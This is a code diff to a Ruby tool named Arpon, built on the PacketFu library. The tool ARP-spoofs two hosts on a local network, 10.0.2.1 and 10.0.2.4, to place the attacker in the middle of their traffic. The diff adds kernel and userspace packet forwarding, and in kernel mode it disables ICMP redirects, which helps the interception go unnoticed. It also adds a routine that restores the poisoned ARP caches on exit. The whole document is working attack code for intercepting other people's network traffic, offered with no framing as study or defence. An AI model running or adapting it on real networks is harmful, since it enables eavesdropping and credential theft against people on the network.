@@ -30,11 +30,12 @@ class Arpon
 	def initialize(iface)
 		@target_list = []
 		@arp_table = {}
+		@threads = []
 		@iface = PacketFu::Utils.whoami?(:iface => iface)
 	end
 
-	def mac_from_ip(ip)
-		if @arp_table[ip] == nil
+	def mac_from_ip(ip, resolve=true)
+		if @arp_table[ip] == nil and resolve == true
 			@arp_table[ip] = PacketFu::Utils::arp(ip)
 		end
 		return @arp_table[ip]
@@ -50,10 +51,26 @@ class Arpon
 		set_arp_cache(target_ip_2, target_ip_1, @iface[:eth_saddr])
 	end
 
-	def start
-		cap = PacketFu::Capture.new(:start => true, :iface => @iface[:iface], :filter => "not host #{@iface[:ip_saddr]} and not arp")
-		@stream = cap.stream
-		Thread.new do
+	def start(forward=false)
+		@forward = forward
+		case @forward
+		when "kernel"
+			`echo 1 > /proc/sys/net/ipv4/ip_forward`
+			`echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects`
+		when "userspace"
+			filter = "host not %s and ether dst %s" % [@iface[:ip_saddr], @iface[:eth_saddr]]
+			cap = PacketFu::Capture.new(:start => true, :promisc => true, :iface => @iface[:iface], :filter => filter, :timeout => 100)
+			@threads << Thread.new do
+				cap.stream.each do |p|
+					pkt = PacketFu::Packet.parse(p)
+					if pkt.proto[1] == 'IP' then
+						pkt.eth_daddr = mac_from_ip(pkt.ip_daddr, false) || mac_from_ip('10.0.2.1', false) # GW
+						pkt.to_w
+					end
+				end
+			end
+		end
+		@threads << Thread.new do
    			loop do
    				@target_list.each do |t|
    					pkt = PacketFu::ARPPacket.new()
@@ -66,24 +83,46 @@ class Arpon
    					pkt.arp_opcode = 2
    					pkt.to_w
    				end
-   				sleep 5
+   				sleep 10
    			end
    		end
 	end
 
-	def stream
-		@stream
+	def stop
+		@started = false
+		@threads.each do |t|
+			Thread.kill(t)
+		end
+		case @forward
+		when "kernel"
+			`echo 0 > /proc/sys/net/ipv4/ip_forward`
+			`echo 1 > /proc/sys/net/ipv4/conf/all/send_redirects`
+		end
+		sleep 1
+		@target_list.each do |t|
+   			pkt = PacketFu::ARPPacket.new()
+   			pkt.eth_saddr = mac_from_ip(t[:spoofed_ip], false)
+   			pkt.eth_daddr = t[:target_mac]
+  			pkt.arp_saddr_mac = mac_from_ip(t[:spoofed_ip], false)
+  			pkt.arp_daddr_mac = t[:target_mac]
+   			pkt.arp_saddr_ip =  t[:spoofed_ip]
+   			pkt.arp_daddr_ip = t[:target_ip]
+   			pkt.arp_opcode = 2
+   			pkt.to_w			
+		end
 	end
+
 end
 
 a = Arpon.new('eth0')
 a.mitm_between('10.0.2.1', '10.0.2.4')
-a.start
-a.stream.each do |p|
-	pkt = PacketFu::Packet.parse(p)
-	print pkt.inspect
-	if pkt.proto[1] == 'IP' then
-		pkt.eth_daddr = a.mac_from_ip(pkt.ip_daddr) || a.mac_from_ip('10.0.2.1') # GW
-		pkt.to_w
-	end
+a.start("kernel")
+
+trap("INT") do 
+	a.stop
+	exit
+end
+
+
+loop do
 end
